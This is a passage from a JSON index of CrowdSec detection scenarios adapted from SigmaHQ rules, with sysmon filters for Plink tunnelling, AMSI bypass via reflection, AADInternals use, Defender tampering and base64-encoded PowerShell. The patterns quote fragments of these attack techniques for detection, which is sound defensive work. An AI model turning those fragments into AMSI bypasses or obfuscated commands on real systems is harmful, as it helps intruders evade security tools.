evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)\n", "path": "scenarios/sigmahq/proc_creation_win_office_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "c1232d23bd050990877a5684fd18be8b552f193cadac2b188a22d552ce38c274"}, "0.2": {"digest": "b83a7a57d07dfd0153d2e207952e956dd1d9ac99e4a0818da6f5a9267856f1a8"}}}, "sigmahq/proc_creation_win_ping_hex_ip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_ping_hex_ip\ndescription: |\n  Detects a ping command that uses a hex encoded IP address\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\ping.exe' && evt.Parsed.CommandLine contains '0x')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1140\n   - attack.t1027\n\n  label: \"Ping Hex IP\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a ping command that uses a hex encoded IP address\n", "path": "scenarios/sigmahq/proc_creation_win_ping_hex_ip.yml", "version": "0.2", "versions": {"0.1": {"digest": "fdb864226a118f1d88f260534898cc4893a6ed83782c74cf2a809dd6dea249a0"}, "0.2": {"digest": "10cb02aab899f38b884f811b55956f31bfe3a0dd52996d3dbe59394811518f4e"}}}, "sigmahq/proc_creation_win_plink_port_forwarding": {"content": "type: trigger\nname: sigmahq/proc_creation_win_plink_port_forwarding\ndescription: |\n  Detects suspicious Plink tunnel port forwarding to a local port\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Description == 'Command-line SSH, Telnet, and Rlogin client' && evt.Parsed.CommandLine contains ' -R ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1572\n   - attack.t1021.001\n\n  label: \"Suspicious Plink Port Forwarding\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Plink tunnel port forwarding to a local port\n", "path": "scenarios/sigmahq/proc_creation_win_plink_port_forwarding.yml", "version": "0.2", "versions": {"0.1": {"digest": "d2ee3e93f288397f5b3ef4ac2bb529a151341cbd8c68df503a4fae5dd0c875ab"}, "0.2": {"digest": "f19effc6982a813a66ef566098dcedb15d113538d118bdee83181e2671a896d2"}}}, "sigmahq/proc_creation_win_plink_susp_tunneling": {"content": "type: trigger\nname: sigmahq/proc_creation_win_plink_susp_tunneling\ndescription: |\n  Execution of plink to perform data exfiltration and tunneling\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\plink.exe' && evt.Parsed.CommandLine contains ':127.0.0.1:3389' || evt.Parsed.Image endsWith '\\\\plink.exe' && evt.Parsed.CommandLine contains ':3389' && (evt.Parsed.CommandLine contains ' -P 443' || evt.Parsed.CommandLine contains ' -P 22'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1572\n\n  label: \"Potential RDP Tunneling Via Plink\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Execution of plink to perform data exfiltration and tunneling\n", "path": "scenarios/sigmahq/proc_creation_win_plink_susp_tunneling.yml", "version": "0.2", "versions": {"0.1": {"digest": "5bd727478964f249e259d4e0141efc64d36c26dd5aff60af06d71d82185266e3"}, "0.2": {"digest": "d7a572a3ecf7aed15f42bbf748bf69e66b10398b14a4bc5c60040fc854e5118e"}}}, "sigmahq/proc_creation_win_powershell_aadinternals_cmdlets_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_aadinternals_cmdlets_execution\ndescription: |\n  Detects ADDInternals Cmdlet execution. A tool for administering Azure AD and Office 365. Which can be abused by threat actors to attack Azure AD or Office 365.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.Exe', 'pwsh.dll']) && (evt.Parsed.CommandLine contains 'Add-AADInt' || evt.Parsed.CommandLine contains 'ConvertTo-AADInt' || evt.Parsed.CommandLine contains 'Disable-AADInt' || evt.Parsed.CommandLine contains 'Enable-AADInt' || evt.Parsed.CommandLine contains 'Export-AADInt' || evt.Parsed.CommandLine contains 'Get-AADInt' || evt.Parsed.CommandLine contains 'Grant-AADInt' || evt.Parsed.CommandLine contains 'Install-AADInt' || evt.Parsed.CommandLine contains 'Invoke-AADInt' || evt.Parsed.CommandLine contains 'Join-AADInt' || evt.Parsed.CommandLine contains 'New-AADInt' || evt.Parsed.CommandLine contains 'Open-AADInt' || evt.Parsed.CommandLine contains 'Read-AADInt' || evt.Parsed.CommandLine contains 'Register-AADInt' || evt.Parsed.CommandLine contains 'Remove-AADInt' || evt.Parsed.CommandLine contains 'Restore-AADInt' || evt.Parsed.CommandLine contains 'Search-AADInt' || evt.Parsed.CommandLine contains 'Send-AADInt' || evt.Parsed.CommandLine contains 'Set-AADInt' || evt.Parsed.CommandLine contains 'Start-AADInt' || evt.Parsed.CommandLine contains 'Update-AADInt'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"AADInternals PowerShell Cmdlets Execution - ProccessCreation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects ADDInternals Cmdlet execution. A tool for administering Azure AD and Office 365. Which can be abused by threat actors to attack Azure AD or Office 365.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_aadinternals_cmdlets_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "d9cd5cc8d19efa3acb257d700a126d0c7a469c61ba01f3f75103c481b6415abc"}, "0.2": {"digest": "7ff2859c0dfaa7a58fbafeb37f3ced8dfcd4d995856a41f8bc90507c75026e37"}}}, "sigmahq/proc_creation_win_powershell_amsi_init_failed_bypass": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_amsi_init_failed_bypass\ndescription: |\n  Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'System.Management.Automation.AmsiUtils' && evt.Parsed.CommandLine contains 'amsiInitFailed' || evt.Parsed.CommandLine contains '[Ref].Assembly.GetType' && evt.Parsed.CommandLine contains 'SetValue($null,$true)' && evt.Parsed.CommandLine contains 'NonPublic,Static')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Potential AMSI Bypass Via .NET Reflection\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_amsi_init_failed_bypass.yml", "version": "0.2", "versions": {"0.1": {"digest": "eeff0132d91d398d97509addceee002f97cf61af7697204cff60f6627b4787c0"}, "0.2": {"digest": "2f54042e365e580b601e9317048ab2d7bd3e3e6d1ee4ec644d1ce82cab96dac0"}}}, "sigmahq/proc_creation_win_powershell_base64_encoded_cmd": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_encoded_cmd\ndescription: |\n  Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains ' -e' && (evt.Parsed.CommandLine contains ' JAB' || evt.Parsed.CommandLine contains ' SUVYI' || evt.Parsed.CommandLine contains ' SQBFAFgA' || evt.Parsed.CommandLine contains ' aQBlAHgA' || evt.Parsed.CommandLine contains ' aWV4I' || evt.Parsed.CommandLine contains ' IAA' || evt.Parsed.CommandLine contains ' IAB' || evt.Parsed.CommandLine contains ' UwB' || evt.Parsed.CommandLine contains ' cwB') || evt.Parsed.CommandLine contains '.exe -ENCOD ' || evt.Parsed.CommandLine contains ' BA^J e-') && not (evt.Parsed.CommandLine contains ' -ExecutionPolicy remotesigned '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious Encoded PowerShell Command Line\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_encoded_cmd.yml", "version": "0.2", "versions": {"0.1": {"digest": "ea750fcf350d7b087be805c774239d7a9fb9363635529b3cfc9d4f8e417813e2"}, "0.2": {"digest": "0340446a29f76ba977d10298d5abd12cd1c061b59e494a700b04c4836a8f95d8"}}}, "sigmahq/proc_creation_win_powershell_base64_encoded_cmd_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_encoded_cmd_patterns\ndescription: |\n  Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.Exe', 'pwsh.dll']) && (evt.Parsed.CommandLine contains ' -e ' || evt.Parsed.CommandLine contains ' -en ' || evt.Parsed.CommandLine contains ' -enc ' || evt.Parsed.CommandLine contains ' -enco') && (evt.Parsed.CommandLine contains ' JAB' || evt.Parsed.CommandLine contains ' SUVYI' || evt.Parsed.CommandLine contains ' SQBFAFgA' || evt.Parsed.CommandLine contains ' aWV4I' || evt.Parsed.CommandLine contains ' IAB' || evt.Parsed.CommandLine contains ' PAA' || evt.Parsed.CommandLine contains ' aQBlAHgA') && not (evt.Parsed.ParentImage contains 'C:\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\' || evt.Parsed.ParentImage contains '\\\\gc_worker.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious PowerShell Encoded Command Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_encoded_cmd_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "216692f7c771186fb00b1c2d486dc47b0502be6ce7fdf966c877e662992ee65a"}, "0.2": {"digest": "412831b9ae42bfcdc5672f4d7216468837e4212d5be7d2275881c8b82f1c0d40"}}}, "sigmahq/proc_creation_win_powershell_base64_encoded_obfusc": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_encoded_obfusc\ndescription: |\n  Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'IAAtAGIAeABvAHIAIAAwAHgA' || evt.Parsed.CommandLine contains 'AALQBiAHgAbwByACAAMAB4A' || evt.Parsed.CommandLine contains 'gAC0AYgB4AG8AcgAgADAAeA' || evt.Parsed.CommandLine contains 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg' || evt.Parsed.CommandLine contains 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI' || evt.Parsed.CommandLine contains 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC' || evt.Parsed.CommandLine contains 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADEAfQB7ADAAfQAiACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAxAH0AewAwAH0AIgAgAC0AZgAg' || evt.Parsed.CommandLine contains 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADAAfQB7ADMAfQAiACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAwAH0AewAzAH0AIgAgAC0AZgAg' || evt.Parsed.CommandLine contains 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADIAfQB7ADAAfQAiACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAyAH0AewAwAH0AIgAgAC0AZgAg' || evt.Parsed.CommandLine contains 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADEAfQB7ADAAfQAnACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAxAH0AewAwAH0AJwAgAC0AZgAg' || evt.Parsed.CommandLine contains 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADAAfQB7ADMAfQAnACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAwAH0AewAzAH0AJwAgAC0AZgAg' || evt.Parsed.CommandLine contains 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI' || evt.Parsed.CommandLine contains 'B7ADIAfQB7ADAAfQAnACAALQBmAC' || evt.Parsed.CommandLine contains 'AewAyAH0AewAwAH0AJwAgAC0AZgAg')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Obfuscated PowerShell Code\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_encoded_obfusc.yml", "version": "0.2", "versions": {"0.1": {"digest": "b0a21a902697ef800721713f2a0c9e22e503d9b1d7d1f43d3445f7209610410f"}, "0.2": {"digest": "2d6f54c68f88ed0c295b297613d2b6b73d7a27bdf2851ca5c06c049f3f3a2890"}}}, "sigmahq/proc_creation_win_powershell_base64_frombase64string": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_frombase64string\ndescription: |\n  Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'OjpGcm9tQmFzZTY0U3RyaW5n' || evt.Parsed.CommandLine contains 'o6RnJvbUJhc2U2NFN0cmluZ' || evt.Parsed.CommandLine contains '6OkZyb21CYXNlNjRTdHJpbm' || evt.Parsed.CommandLine contains 'OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA' || evt.Parsed.CommandLine contains 'oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA' || evt.Parsed.CommandLine contains '6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1140\n   - attack.t1059.001\n\n  label: \"PowerShell Base64 Encoded FromBase64String Cmdlet\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_frombase64string.yml", "version": "0.2", "versions": {"0.1": {"digest": "be2092a15726363823cd5dbba22cc376c7da942741c0f9ec1e9ad4051411d738"}, "0.2": {"digest": "5e2aba65002195f132bed2ce667d2a1c66c49fcf6bdae2f62367ff314203d5b0"}}}, "sigmahq/proc_creation_win_powershell_base64_hidden_flag": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_hidden_flag\ndescription: |\n  Detects base64 encoded strings used in hidden malicious PowerShell command lines\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && evt.Parsed.CommandLine contains ' hidden ' && (evt.Parsed.CommandLine contains 'AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA' || evt.Parsed.CommandLine contains 'aXRzYWRtaW4gL3RyYW5zZmVy' || evt.Parsed.CommandLine contains 'IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA' || evt.Parsed.CommandLine contains 'JpdHNhZG1pbiAvdHJhbnNmZX' || evt.Parsed.CommandLine contains 'YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg' || evt.Parsed.CommandLine contains 'Yml0c2FkbWluIC90cmFuc2Zlc' || evt.Parsed.CommandLine contains 'AGMAaAB1AG4AawBfAHMAaQB6AGUA' || evt.Parsed.CommandLine contains 'JABjAGgAdQBuAGsAXwBzAGkAegBlA' || evt.Parsed.CommandLine contains 'JGNodW5rX3Npem' || evt.Parsed.CommandLine contains 'QAYwBoAHUAbgBrAF8AcwBpAHoAZQ' || evt.Parsed.CommandLine contains 'RjaHVua19zaXpl' || evt.Parsed.CommandLine contains 'Y2h1bmtfc2l6Z' || evt.Parsed.CommandLine contains 'AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A' || evt.Parsed.CommandLine contains 'kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg' || evt.Parsed.CommandLine contains 'lPLkNvbXByZXNzaW9u' || evt.Parsed.CommandLine contains 'SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA' || evt.Parsed.CommandLine contains 'SU8uQ29tcHJlc3Npb2' || evt.Parsed.CommandLine contains 'Ty5Db21wcmVzc2lvb' || evt.Parsed.CommandLine contains 'AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ' || evt.Parsed.CommandLine contains 'kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA' || evt.Parsed.CommandLine contains 'lPLk1lbW9yeVN0cmVhb' || evt.Parsed.CommandLine contains 'SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A' || evt.Parsed.CommandLine contains 'SU8uTWVtb3J5U3RyZWFt' || evt.Parsed.CommandLine contains 'Ty5NZW1vcnlTdHJlYW' || evt.Parsed.CommandLine contains '4ARwBlAHQAQwBoAHUAbgBrA' || evt.Parsed.CommandLine contains '5HZXRDaHVua' || evt.Parsed.CommandLine contains 'AEcAZQB0AEMAaAB1AG4Aaw' || evt.Parsed.CommandLine contains 'LgBHAGUAdABDAGgAdQBuAGsA' || evt.Parsed.CommandLine contains 'LkdldENodW5r' || evt.Parsed.CommandLine contains 'R2V0Q2h1bm' || evt.Parsed.CommandLine contains 'AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A' || evt.Parsed.CommandLine contains 'QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA' || evt.Parsed.CommandLine contains 'RIUkVBRF9JTkZPNj' || evt.Parsed.CommandLine contains 'SFJFQURfSU5GTzY0' || evt.Parsed.CommandLine contains 'VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA' || evt.Parsed.CommandLine contains 'VEhSRUFEX0lORk82N' || evt.Parsed.CommandLine contains 'AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA' || evt.Parsed.CommandLine contains 'cmVhdGVSZW1vdGVUaHJlYW' || evt.Parsed.CommandLine contains 'MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA' || evt.Parsed.CommandLine contains 'NyZWF0ZVJlbW90ZVRocmVhZ' || evt.Parsed.CommandLine contains 'Q3JlYXRlUmVtb3RlVGhyZWFk' || evt.Parsed.CommandLine contains 'QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA' || evt.Parsed.CommandLine contains '0AZQBtAG0AbwB2AGUA' || evt.Parsed.CommandLine contains '1lbW1vdm' || evt.Parsed.CommandLine contains 'AGUAbQBtAG8AdgBlA' || evt.Parsed.CommandLine contains 'bQBlAG0AbQBvAHYAZQ' || evt.Parsed.CommandLine contains 'bWVtbW92Z' || evt.Parsed.CommandLine contains 'ZW1tb3Zl'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Malicious Base64 Encoded PowerShell Keywords in Command Lines\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects base64 encoded strings used in hidden malicious PowerShell command lines\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_hidden_flag.yml", "version": "0.2", "versions": {"0.1": {"digest": "309332ac18cfcfb877340e499ee229cbdc85a9bdd8426eb3c70f8ba78e46adf7"}, "0.2": {"digest": "ef3685b6c74fb9dfd101c9f2bad95855786412c08e3b580a0cb370c5852cd21b"}}}, "sigmahq/proc_creation_win_powershell_base64_iex": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_iex\ndescription: |\n  Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'SUVYIChb' || evt.Parsed.CommandLine contains 'lFWCAoW' || evt.Parsed.CommandLine contains 'JRVggKF' || evt.Parsed.CommandLine contains 'aWV4IChb' || evt.Parsed.CommandLine contains 'lleCAoW' || evt.Parsed.CommandLine contains 'pZXggKF' || evt.Parsed.CommandLine contains 'aWV4IChOZX' || evt.Parsed.CommandLine contains 'lleCAoTmV3' || evt.Parsed.CommandLine contains 'pZXggKE5ld' || evt.Parsed.CommandLine contains 'SUVYIChOZX' || evt.Parsed.CommandLine contains 'lFWCAoTmV3' || evt.Parsed.CommandLine contains 'JRVggKE5ld' || evt.Parsed.CommandLine contains 'SUVYKF' || evt.Parsed.CommandLine contains 'lFWChb' || evt.Parsed.CommandLine contains 'JRVgoW' || evt.Parsed.CommandLine contains 'aWV4KF' || evt.Parsed.CommandLine contains 'lleChb' || evt.Parsed.CommandLine contains 'pZXgoW' || evt.Parsed.CommandLine contains 'aWV4KE5ld' || evt.Parsed.CommandLine contains 'lleChOZX' || evt.Parsed.CommandLine contains 'pZXgoTmV3' || evt.Parsed.CommandLine contains 'SUVYKE5ld' || evt.Parsed.CommandLine contains 'lFWChOZX' || evt.Parsed.CommandLine contains 'JRVgoTmV3' || evt.Parsed.CommandLine contains 'SUVYKCgn' || evt.Parsed.CommandLine contains 'lFWCgoJ' || evt.Parsed.CommandLine contains 'JRVgoKC' || evt.Parsed.CommandLine contains 'aWV4KCgn' || evt.Parsed.CommandLine contains 'lleCgoJ' || evt.Parsed.CommandLine contains 'pZXgoKC' || evt.Parsed.CommandLine contains 'SQBFAFgAIAAoAFsA' || evt.Parsed.CommandLine contains 'kARQBYACAAKABbA' || evt.Parsed.CommandLine contains 'JAEUAWAAgACgAWw' || evt.Parsed.CommandLine contains 'aQBlAHgAIAAoAFsA' || evt.Parsed.CommandLine contains 'kAZQB4ACAAKABbA' || evt.Parsed.CommandLine contains 'pAGUAeAAgACgAWw' || evt.Parsed.CommandLine contains 'aQBlAHgAIAAoAE4AZQB3A' || evt.Parsed.CommandLine contains 'kAZQB4ACAAKABOAGUAdw' || evt.Parsed.CommandLine contains 'pAGUAeAAgACgATgBlAHcA' || evt.Parsed.CommandLine contains 'SQBFAFgAIAAoAE4AZQB3A' || evt.Parsed.CommandLine contains 'kARQBYACAAKABOAGUAdw' || evt.Parsed.CommandLine contains 'JAEUAWAAgACgATgBlAHcA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"PowerShell Base64 Encoded IEX Cmdlet\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_iex.yml", "version": "0.2", "versions": {"0.1": {"digest": "ff3aca507ba50d33e5ac35789cf010426c941f654a7deb21d3c98b57c3c36e25"}, "0.2": {"digest": "8ebe421cdf16aafe53f9abb766015b5306b4502ccbf02231d328d56c88a91bd1"}}}, "sigmahq/proc_creation_win_powershell_base64_invoke": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_invoke\ndescription: |\n  Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && evt.Parsed.CommandLine contains ' -e' && (evt.Parsed.CommandLine contains 'SQBuAHYAbwBrAGUALQ' || evt.Parsed.CommandLine contains 'kAbgB2AG8AawBlAC0A' || evt.Parsed.CommandLine contains 'JAG4AdgBvAGsAZQAtA' || evt.Parsed.CommandLine contains 'SW52b2tlL' || evt.Parsed.CommandLine contains 'ludm9rZS' || evt.Parsed.CommandLine contains 'JbnZva2Ut'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027\n\n  label: \"PowerShell Base64 Encoded Invoke Keyword\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_invoke.yml", "version": "0.2", "versions": {"0.1": {"digest": "ee7f37b7dbd6a099c3378829d31b026d3e5844690dbb805bcbc1eb7981f28f04"}, "0.2": {"digest": "8f6e472e86a2a0f65894ce005ff29539c8029d146e9949e30661e84e6437f63e"}}}, "sigmahq/proc_creation_win_powershell_base64_mppreference": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_mppreference\ndescription: |\n  Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'QWRkLU1wUHJlZmVyZW5jZS' || evt.Parsed.CommandLine contains 'FkZC1NcFByZWZlcmVuY2Ug' || evt.Parsed.CommandLine contains 'BZGQtTXBQcmVmZXJlbmNlI' || evt.Parsed.CommandLine contains 'U2V0LU1wUHJlZmVyZW5jZS' || evt.Parsed.CommandLine contains 'NldC1NcFByZWZlcmVuY2Ug' || evt.Parsed.CommandLine contains 'TZXQtTXBQcmVmZXJlbmNlI' || evt.Parsed.CommandLine contains 'YWRkLW1wcHJlZmVyZW5jZS' || evt.Parsed.CommandLine contains 'FkZC1tcHByZWZlcmVuY2Ug' || evt.Parsed.CommandLine contains 'hZGQtbXBwcmVmZXJlbmNlI' || evt.Parsed.CommandLine contains 'c2V0LW1wcHJlZmVyZW5jZS' || evt.Parsed.CommandLine contains 'NldC1tcHByZWZlcmVuY2Ug' || evt.Parsed.CommandLine contains 'zZXQtbXBwcmVmZXJlbmNlI' || evt.Parsed.CommandLine contains 'QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA' || evt.Parsed.CommandLine contains 'EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA' || evt.Parsed.CommandLine contains 'BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA' || evt.Parsed.CommandLine contains 'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA' || evt.Parsed.CommandLine contains 'MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA' || evt.Parsed.CommandLine contains 'TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA' || evt.Parsed.CommandLine contains 'YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA' || evt.Parsed.CommandLine contains 'EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA' || evt.Parsed.CommandLine contains 'hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA' || evt.Parsed.CommandLine contains 'cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA' || evt.Parsed.CommandLine contains 